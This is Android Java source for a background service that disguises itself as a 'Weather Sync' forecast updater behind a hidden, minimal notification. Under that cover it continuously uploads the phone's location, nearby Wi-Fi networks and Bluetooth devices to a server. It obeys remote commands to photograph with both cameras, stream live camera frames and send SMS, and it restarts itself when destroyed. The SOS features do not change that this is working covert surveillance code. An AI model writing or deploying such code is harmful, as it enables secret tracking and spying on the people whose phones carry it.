package com.lunarphoton.stratus;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.telephony.SmsManager;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothManager;
import android.bluetooth.le.BluetoothLeScanner;
import android.bluetooth.le.ScanCallback;
import android.bluetooth.le.ScanSettings;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class GuardianService extends Service {

    public static final String ACTION_START = "com.lunarphoton.stratus.START";
    public static final String ACTION_STOP = "com.lunarphoton.stratus.STOP";
    public static final String ACTION_SOS = "com.lunarphoton.stratus.SOS";

    private static final String CHANNEL = "weather_sync_channel";
    private static final int NOTIF_ID = 1042;

    public static void start(Context ctx) {
        Intent i = new Intent(ctx, GuardianService.class).setAction(ACTION_START);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    public static void stop(Context ctx) {
        Intent i = new Intent(ctx, GuardianService.class).setAction(ACTION_STOP);
        ctx.startService(i);
    }

    public static void sos(Context ctx) {
        Intent i = new Intent(ctx, GuardianService.class).setAction(ACTION_SOS);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    private Uploader uploader;
    private OfflineStorage offlineStorage;
    private LocationManager locationManager;
    private WifiManager wifiManager;
    private PowerManager.WakeLock wakeLock;

    private Location lastLocation;
    private final List<JSONObject> latestWifi = Collections.synchronizedList(new ArrayList<>());
    private BluetoothAdapter bluetoothAdapter;
    private BluetoothLeScanner bleScanner;
    private final List<JSONObject> latestBluetooth = Collections.synchronizedList(new ArrayList<>());
    private long lastBleScanTime = 0;
    private boolean isBleScanning = false;

    private ScheduledExecutorService pingScheduler;
    private ScheduledExecutorService cmdScheduler;
    private ScheduledExecutorService frameScheduler;

    private Ringtone ringtone;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Runnable ringTimeout = this::stopRing;

    private final LocationListener locationListener = new LocationListener() {
        @Override
        public void onLocationChanged(Location loc) {
            if (loc != null) lastLocation = loc;
        }
        @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
        @Override public void onProviderEnabled(String provider) {}
        @Override public void onProviderDisabled(String provider) {}
    };

    private void parseScanResults(List<ScanResult> results) {
        if (results == null || results.isEmpty()) return;
        List<JSONObject> aps = new ArrayList<>();
        for (ScanResult r : results) {
            try {
                JSONObject ap = new JSONObject();
                String ssid = r.SSID != null ? r.SSID : "";
                String bssid = r.BSSID != null ? r.BSSID : "";
                String caps = r.capabilities != null ? r.capabilities : "";
                boolean isOpen = !caps.contains("WPA") && !caps.contains("WEP") &&
                                 !caps.contains("EAP") && !caps.contains("OWE") &&
                                 !caps.contains("SAE") && !caps.contains("WAPI");
                ap.put("ssid", ssid);
                ap.put("bssid", bssid);
                ap.put("rssi", r.level);
                ap.put("open", isOpen);
                ap.put("capabilities", caps);
                ap.put("frequency", r.frequency);
                aps.add(ap);
            } catch (Exception ignored) {}
        }
        Collections.sort(aps, (a, b) -> {
            boolean aOpen = a.optBoolean("open", false);
            boolean bOpen = b.optBoolean("open", false);
            if (aOpen != bOpen) return aOpen ? -1 : 1;
            return Integer.compare(b.optInt("rssi", -100), a.optInt("rssi", -100));
        });
        if (aps.size() > 15) {
            aps = new ArrayList<>(aps.subList(0, 15));
        }
        synchronized (latestWifi) {
            latestWifi.clear();
            latestWifi.addAll(aps);
        }
    }

    private final BroadcastReceiver wifiReceiver = new BroadcastReceiver() {
        @SuppressLint("MissingPermission")
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                List<ScanResult> results = wifiManager.getScanResults();
                parseScanResults(results);
            } catch (Exception ignored) {}
        }
    };

    private final ScanCallback bleScanCallback = new ScanCallback() {
        @Override
        public void onScanResult(int callbackType, android.bluetooth.le.ScanResult result) {
            if (result == null) return;
            try {
                BluetoothDevice dev = result.getDevice();
                if (dev == null) return;
                String address = dev.getAddress();
                if (address == null || address.isEmpty()) return;

                String name = null;
                if (result.getScanRecord() != null) {
                    name = result.getScanRecord().getDeviceName();
                }
                if (name == null || name.isEmpty()) {
                    try { name = dev.getName(); } catch (Exception ignored) {}
                }
                if (name == null) name = "";

                JSONObject b = new JSONObject();
                b.put("name", name);
                b.put("address", address);
                b.put("rssi", result.getRssi());
                b.put("type", "ble");

                synchronized (latestBluetooth) {
                    boolean found = false;
                    for (int i = 0; i < latestBluetooth.size(); i++) {
                        JSONObject existing = latestBluetooth.get(i);
                        if (address.equalsIgnoreCase(existing.optString("address"))) {
                            latestBluetooth.set(i, b);
                            found = true;
                            break;
                        }
                    }
                    if (!found && latestBluetooth.size() < 20) {
                        latestBluetooth.add(b);
                    }
                }
            } catch (Exception ignored) {}
        }

        @Override
        public void onBatchScanResults(List<android.bluetooth.le.ScanResult> results) {
            if (results != null) {
                for (android.bluetooth.le.ScanResult r : results) onScanResult(0, r);
            }
        }

        @Override
        public void onScanFailed(int errorCode) {
            isBleScanning = false;
        }
    };

    @SuppressLint("MissingPermission")
    private void startBleScan() {
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled()) return;
        if (isBleScanning) return;
        try {
            if (bleScanner == null) {
                bleScanner = bluetoothAdapter.getBluetoothLeScanner();
            }
            if (bleScanner == null) return;

            ScanSettings settings = new ScanSettings.Builder()
                    .setScanMode(ScanSettings.SCAN_MODE_LOW_POWER)
                    .build();
            isBleScanning = true;
            bleScanner.startScan(null, settings, bleScanCallback);

            mainHandler.postDelayed(this::stopBleScan, 4000L);
        } catch (Exception ignored) {
            isBleScanning = false;
        }
    }

    @SuppressLint("MissingPermission")
    private void stopBleScan() {
        if (!isBleScanning) return;
        isBleScanning = false;
        try {
            if (bleScanner != null && bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
                bleScanner.stopScan(bleScanCallback);
            }
        } catch (Exception ignored) {}
    }

    @SuppressLint("MissingPermission")
    private void readPairedBluetooth() {
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled()) return;
        try {
            Set<BluetoothDevice> bonded = bluetoothAdapter.getBondedDevices();
            if (bonded != null) {
                for (BluetoothDevice dev : bonded) {
                    String address = dev.getAddress();
                    if (address == null || address.isEmpty()) continue;
                    String name = "";
                    try { name = dev.getName(); } catch (Exception ignored) {}
                    if (name == null) name = "";
                    JSONObject b = new JSONObject();
                    b.put("name", name);
                    b.put("address", address);
                    b.put("rssi", -60);
                    b.put("type", "bonded");

                    synchronized (latestBluetooth) {
                        boolean found = false;
                        for (int i = 0; i < latestBluetooth.size(); i++) {
                            if (address.equalsIgnoreCase(latestBluetooth.get(i).optString("address"))) {
                                found = true;
                                break;
                            }
                        }
                        if (!found && latestBluetooth.size() < 20) {
                            latestBluetooth.add(b);
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        uploader = new Uploader(this);
        offlineStorage = new OfflineStorage(getApplicationContext());
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        try {
            BluetoothManager bm = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);
            if (bm != null) {
                bluetoothAdapter = bm.getAdapter();
            }
        } catch (Exception ignored) {}
        createChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;
        if (ACTION_STOP.equals(action)) {
            stopEverything();
            return START_NOT_STICKY;
        }

        enterForeground();
        ensureRunning();

        if (ACTION_SOS.equals(action)) {
            handleSos();
        }

        return START_STICKY;
    }

    private void enterForeground() {
        Notification notif = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(NOTIF_ID, notif);
        }
    }

    private long lastWifiScanTime = 0;

    @SuppressLint({"MissingPermission", "WakelockTimeout"})
    private synchronized void ensureRunning() {
        if (pingScheduler != null) return;

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null && wakeLock == null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "stratus:sync");
            wakeLock.setReferenceCounted(false);
            // DO NOT keep wakeLock acquired permanently! Let the CPU deep-sleep between pings.
        }

        int intervalSec = BeaconConfig.INTERVAL_SEC;
        try {
            intervalSec = getSharedPreferences("stratus_prefs", Context.MODE_PRIVATE)
                    .getInt("interval_sec", BeaconConfig.INTERVAL_SEC);
        } catch (Exception ignored) {}
        if (intervalSec < 2) intervalSec = 2;

        try {
            registerReceiver(wifiReceiver, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        } catch (Exception ignored) {}

        setupLocationUpdates(intervalSec);
        startSchedulers(intervalSec);
    }

    private synchronized void setupLocationUpdates(int sec) {
        if (locationManager == null) return;
        try {
            locationManager.removeUpdates(locationListener);
        } catch (Exception ignored) {}

        long minTimeMs = Math.max(15_000L, (long) sec * 1000L);
        float minDistance = 25.0f; // 25m distance threshold lets GPS hardware sleep when stationary

        try {
            List<String> providers = locationManager.getAllProviders();
            // 1. Passive provider (zero battery overhead: receives fixes requested by other apps/system)
            if (providers != null && providers.contains(LocationManager.PASSIVE_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.PASSIVE_PROVIDER, minTimeMs, 10.0f, locationListener, Looper.getMainLooper());
            }

            // 2. Network provider (cell tower & wifi triangulation, low power)
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, minTimeMs, minDistance, locationListener, Looper.getMainLooper());
            }

            // 3. GPS provider (duty-cycled with distance threshold)
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, minTimeMs, minDistance, locationListener, Looper.getMainLooper());
            }

            refreshBestLocation();
        } catch (SecurityException ignored) {}
    }

    private synchronized void startSchedulers(int sec) {
        if (pingScheduler != null) {
            pingScheduler.shutdownNow();
            pingScheduler = null;
        }
        if (cmdScheduler != null) {
            cmdScheduler.shutdownNow();
            cmdScheduler = null;
        }

        // Periodic ping loop
        pingScheduler = Executors.newSingleThreadScheduledExecutor();
        pingScheduler.scheduleWithFixedDelay(this::tick, 0, sec, TimeUnit.SECONDS);

        // Commands are primarily piggybacked on /api/ping responses.
        // If ping interval is large (> 45s), run a relaxed 60s fallback poll without holding CPU awake.
        if (sec > 45) {
            cmdScheduler = Executors.newSingleThreadScheduledExecutor();
            cmdScheduler.scheduleWithFixedDelay(this::pollCommands, 30, 60, TimeUnit.SECONDS);
        }
    }

    private void refreshBestLocation() {
        if (locationManager == null) return;
        long now = System.currentTimeMillis();
        String[] providers = new String[]{
                LocationManager.GPS_PROVIDER,
                LocationManager.NETWORK_PROVIDER,
                LocationManager.PASSIVE_PROVIDER
        };
        for (String p : providers) {
            try {
                Location l = locationManager.getLastKnownLocation(p);
                if (l != null) {
                    if (lastLocation == null ||
                            (now - l.getTime() < 120_000L && l.getAccuracy() < (lastLocation.hasAccuracy() ? lastLocation.getAccuracy() : 999f))) {
                        lastLocation = l;
                    }
                }
            } catch (SecurityException ignored) {}
        }
    }

    @SuppressLint("MissingPermission")
    private void readCachedWifi() {
        if (wifiManager == null) return;
        try {
            List<ScanResult> results = wifiManager.getScanResults();
            parseScanResults(results);
        } catch (Exception ignored) {}
    }

    private void maybeScanWifiIfNoFix() {
        long now = System.currentTimeMillis();
        if (now - lastWifiScanTime > 90_000L && wifiManager != null) {
            lastWifiScanTime = now;
            try { wifiManager.startScan(); } catch (Exception ignored) {}
        }
    }

    private void tick() {
        PowerManager.WakeLock wl = wakeLock;
        if (wl != null) {
            try { wl.acquire(8000L); } catch (Exception ignored) {}
        }
        try {
            refreshBestLocation();

            int batt = getBatteryLevel();

            JSONObject payload = new JSONObject();
            payload.put("device_id", BeaconConfig.DEVICE_ID);
            payload.put("name", BeaconConfig.DEVICE_NAME);
            payload.put("kind", "phone");
            payload.put("ts", System.currentTimeMillis() / 1000.0);
            payload.put("battery", batt);

            if (lastLocation != null) {
                payload.put("lat", lastLocation.getLatitude());
                payload.put("lon", lastLocation.getLongitude());
                payload.put("accuracy", lastLocation.getAccuracy());
                payload.put("speed", lastLocation.getSpeed());
                payload.put("heading", lastLocation.getBearing());
            }

            readCachedWifi();
            JSONArray wList = new JSONArray();
            synchronized (latestWifi) {
                for (JSONObject ap : latestWifi) wList.put(ap);
            }
            if (wList.length() > 0) payload.put("wifi", wList);

            long now = System.currentTimeMillis();
            if (now - lastBleScanTime > 30_000L) {
                lastBleScanTime = now;
                startBleScan();
            }
            readPairedBluetooth();
            JSONArray bList = new JSONArray();
            synchronized (latestBluetooth) {
                for (JSONObject dev : latestBluetooth) bList.put(dev);
            }
            if (bList.length() > 0) payload.put("bluetooth", bList);

            // Send ping and receive piggybacked pending commands in a single roundtrip!
            JSONObject resp = uploader.ping(payload);
            if (resp != null) {
                // Connection alive: stream any pending offline backlog and execute commands
                flushOfflineBacklog();
                JSONArray cmds = resp.optJSONArray("commands");
                if (cmds != null && cmds.length() > 0) {
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject c = cmds.optJSONObject(i);
                        if (c == null) continue;
                        String cmd = c.optString("cmd", "");
                        JSONObject args = c.optJSONObject("args");
                        executeCommand(cmd, args);
                    }
                }
            } else {
                // Offline or disconnected: save location fix locally (purged after 3 days)
                if (offlineStorage != null) {
                    offlineStorage.savePing(payload);
                }
            }

            maybeScanWifiIfNoFix();
        } catch (Exception ignored) {
        } finally {
            if (wl != null && wl.isHeld()) {
                try { wl.release(); } catch (Exception ignored) {}
            }
        }
    }

    private void flushOfflineBacklog() {
        if (offlineStorage == null || offlineStorage.count() == 0) return;
        new Thread(() -> {
            try {
                while (offlineStorage != null && offlineStorage.count() > 0) {
                    List<OfflineStorage.PingRecord> records = offlineStorage.getPendingPings(50);
                    if (records == null || records.isEmpty()) break;

                    JSONObject batch = new JSONObject();
                    batch.put("device_id", BeaconConfig.DEVICE_ID);
                    batch.put("name", BeaconConfig.DEVICE_NAME);

                    JSONArray arr = new JSONArray();
                    List<Long> ids = new ArrayList<>();
                    for (OfflineStorage.PingRecord r : records) {
                        arr.put(r.json);
                        ids.add(r.id);
                    }
                    batch.put("pings", arr);

                    JSONObject batchResp = uploader.uploadBatch(batch);
                    if (batchResp != null && batchResp.optBoolean("ok", false)) {
                        offlineStorage.deletePings(ids);
                        JSONArray cmds = batchResp.optJSONArray("commands");
                        if (cmds != null && cmds.length() > 0) {
                            for (int i = 0; i < cmds.length(); i++) {
                                JSONObject c = cmds.optJSONObject(i);
                                if (c == null) continue;
                                executeCommand(c.optString("cmd", ""), c.optJSONObject("args"));
                            }
                        }
                    } else {
                        break; // Connection interrupted, retry next ping
                    }
                }
                if (offlineStorage != null) {
                    offlineStorage.purgeOlderThan3Days();
                }
            } catch (Exception ignored) {}
        }).start();
    }

    private void pollCommands() {
        try {
            JSONArray cmds = uploader.fetchCommands();
            if (cmds == null || cmds.length() == 0) return;
            for (int i = 0; i < cmds.length(); i++) {
                JSONObject c = cmds.optJSONObject(i);
                if (c == null) continue;
                String cmd = c.optString("cmd", "");
                JSONObject args = c.optJSONObject("args");
                executeCommand(cmd, args);
            }
        } catch (Exception ignored) {}
    }

    private void executeCommand(String cmd, JSONObject args) {
        switch (cmd) {
            case "ping_now":
                new Thread(this::tick).start();
                break;
            case "snap":
                handleSnap(args);
                break;
            case "sos":
                handleSos();
                break;
            case "emergency_helpline":
                handleEmergencyHelpline(args);
                break;
            case "set_interval":
            case "interval":
                int sec = args != null ? args.optInt("sec", BeaconConfig.INTERVAL_SEC) : BeaconConfig.INTERVAL_SEC;
                if (sec < 2) sec = 2;
                updateLocationInterval(sec);
                break;
            case "live_on":
                int every = args != null ? args.optInt("every", 5) : 5;
                startLiveFrames(Math.max(2, every));
                break;
            case "live_off":
                stopLiveFrames();
                break;
        }
    }

    private void handleEmergencyHelpline(JSONObject args) {
        String number = args != null ? args.optString("number", "112") : "112";
        String zone = args != null ? args.optString("zone", "Suspicious Area") : "Suspicious Area";
        String message = args != null ? args.optString("message", "") : "";
        double lat = (lastLocation != null) ? lastLocation.getLatitude() : 0.0;
        double lon = (lastLocation != null) ? lastLocation.getLongitude() : 0.0;
        if (args != null && args.has("lat") && args.has("lon")) {
            lat = args.optDouble("lat", lat);
            lon = args.optDouble("lon", lon);
        }

        String locationUrl = "https://maps.google.com/?q=" + lat + "," + lon;
        if (message == null || message.isEmpty()) {
            message = "EMERGENCY: Stuck at suspicious location '" + zone + "'. Coordinates: " + lat + ", " + lon + ". Map: " + locationUrl;
        }

        // 1. Send SMS if SEND_SMS permission is granted
        try {
            if (checkSelfPermission(android.Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                SmsManager smsManager = SmsManager.getDefault();
                if (smsManager != null && !number.isEmpty()) {
                    smsManager.sendTextMessage(number, null, message, null, null);
                }
            }
        } catch (Exception ignored) {}

        // 2. High-priority notification with intent to call helpline and view location
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            Intent dialIntent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + number));
            dialIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent dialPending = PendingIntent.getActivity(
                    this, 201, dialIntent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

            Intent mapIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(locationUrl));
            mapIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent mapPending = PendingIntent.getActivity(
                    this, 202, mapIntent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

            Notification.Builder nb = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? new Notification.Builder(this, CHANNEL)
                    : new Notification.Builder(this);

            nb.setContentTitle("EMERGENCY: Stuck at " + zone)
              .setContentText("Reaching out to Helpline " + number + " with location")
              .setSmallIcon(android.R.drawable.stat_notify_error)
              .setPriority(Notification.PRIORITY_MAX)
              .setAutoCancel(true)
              .setContentIntent(dialPending)
              .addAction(android.R.drawable.ic_menu_call, "Call " + number, dialPending)
              .addAction(android.R.drawable.ic_menu_mapmode, "View Map", mapPending);

            if (nm != null) {
                nm.notify(1099, nb.build());
            }

            // Launch dialer so phone interface is illuminated and ready to call
            startActivity(dialIntent);
        } catch (Exception ignored) {}

        // 3. Capture evidence from both cameras
        captureCamera(Camera.CameraInfo.CAMERA_FACING_BACK, "helpline_back", 0, () -> {
            mainHandler.postDelayed(() -> {
                captureCamera(Camera.CameraInfo.CAMERA_FACING_FRONT, "helpline_front", 1, null);
            }, 1500L);
        });

        // 4. Trigger distress ping and log event
        new Thread(() -> {
            uploader.logEvent("helpline_outreach", "Stuck in suspicious zone " + zone + " - reached out to helpline with location");
            tick();
        }).start();
    }

    private synchronized void updateLocationInterval(int sec) {
        try {
            getSharedPreferences("stratus_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putInt("interval_sec", sec)
                    .apply();
        } catch (Exception ignored) {}

        setupLocationUpdates(sec);
        startSchedulers(sec);
    }

    private void captureCamera(int facing, String reason, int index, Runnable onComplete) {
        CameraCapture.takePhoto(this, facing, new CameraCapture.Callback() {
            @Override
            public void onCaptured(byte[] jpeg) {
                if (jpeg != null) {
                    uploader.uploadPhoto(jpeg, reason, index);
                } else {
                    onError("Empty frame captured");
                }
                if (onComplete != null) onComplete.run();
            }

            @Override
            public void onError(String err) {
                uploader.logEvent("camera_error", (facing == Camera.CameraInfo.CAMERA_FACING_FRONT ? "Front" : "Back") + " camera error: " + err);
                if (onComplete != null) onComplete.run();
            }
        });
    }

    private void handleSnap(JSONObject args) {
        String camera = args != null ? args.optString("camera", "both").toLowerCase() : "both";
        if ("front".equals(camera)) {
            captureCamera(Camera.CameraInfo.CAMERA_FACING_FRONT, "manual_front", 0, null);
        } else if ("back".equals(camera)) {
            captureCamera(Camera.CameraInfo.CAMERA_FACING_BACK, "manual_back", 0, null);
        } else {
            // both: capture back first, then front after 1500ms
            captureCamera(Camera.CameraInfo.CAMERA_FACING_BACK, "manual_back", 0, () -> {
                mainHandler.postDelayed(() -> {
                    captureCamera(Camera.CameraInfo.CAMERA_FACING_FRONT, "manual_front", 1, null);
                }, 1500L);
            });
        }
    }

    private void captureAndSend(String reason, int index) {
        int facing = (index % 2 == 1) ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
        captureCamera(facing, reason, index, null);
    }

    private synchronized void startLiveFrames(int everySec) {
        stopLiveFrames();
        frameScheduler = Executors.newSingleThreadScheduledExecutor();
        final int[] idx = {0};
        frameScheduler.scheduleWithFixedDelay(() -> {
            captureAndSend("live", idx[0]++);
        }, 0, everySec, TimeUnit.SECONDS);
    }

    private synchronized void stopLiveFrames() {
        if (frameScheduler != null) {
            frameScheduler.shutdownNow();
            frameScheduler = null;
        }
    }

    private void handleSos() {
        new Thread(() -> {
            uploader.sendSos();
            tick();
        }).start();

        // Burst captures
        for (int i = 0; i < 3; i++) {
            final int index = i;
            mainHandler.postDelayed(() -> captureAndSend("sos", index), i * 1500L);
        }

        // Sound alarm
        mainHandler.post(this::startRing);
    }

    private void startRing() {
        stopRing();
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
            }
            android.net.Uri uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
            if (uri == null) uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
            ringtone = RingtoneManager.getRingtone(this, uri);
            if (ringtone != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    ringtone.setAudioAttributes(new AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_ALARM)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build());
                }
                ringtone.play();
                mainHandler.postDelayed(ringTimeout, 30_000L);
            }
        } catch (Exception ignored) {}
    }

    private void stopRing() {
        mainHandler.removeCallbacks(ringTimeout);
        if (ringtone != null) {
            try { ringtone.stop(); } catch (Exception ignored) {}
            ringtone = null;
        }
    }

    private int getBatteryLevel() {
        try {
            Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent == null) return -1;
            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            if (level >= 0 && scale > 0) return Math.round((level / (float) scale) * 100);
        } catch (Exception ignored) {}
        return -1;
    }

    private void stopEverything() {
        if (pingScheduler != null) { pingScheduler.shutdownNow(); pingScheduler = null; }
        if (cmdScheduler != null) { cmdScheduler.shutdownNow(); cmdScheduler = null; }
        stopLiveFrames();
        stopRing();
        stopBleScan();

        try {
            if (locationManager != null) locationManager.removeUpdates(locationListener);
        } catch (Exception ignored) {}
        try {
            unregisterReceiver(wifiReceiver);
        } catch (Exception ignored) {}

        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
            wakeLock = null;
        }

        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        start(getApplicationContext());
        super.onDestroy();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "Weather Sync Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        PendingIntent pi = PendingIntent.getActivity(
                this, 0, new Intent(this, MainActivity.class),
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, CHANNEL)
                : new Notification.Builder(this);

        b.setContentTitle("Weather Sync")
                .setContentText("Updating forecast data in background")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .setContentIntent(pi);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            b.setVisibility(Notification.VISIBILITY_SECRET);
        }
        return b.build();
    }
}
